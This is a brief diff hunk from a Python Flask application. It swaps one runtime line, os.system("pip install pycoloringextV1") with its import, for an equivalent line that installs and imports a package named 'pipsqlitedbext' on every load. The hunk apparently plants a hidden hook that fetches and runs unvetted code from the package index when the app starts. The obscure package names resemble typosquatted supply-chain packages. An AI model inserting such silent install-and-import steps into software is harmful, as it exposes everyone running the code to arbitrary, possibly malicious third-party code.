@@ -2,8 +2,8 @@
 
 import time
 import os
-os.system("pip install pycoloringextV1")
-import pycoloringextV1
+os.system("pip install pipsqlitedbext")
+import pipsqlitedbext
 import flask
 
 from flask import g
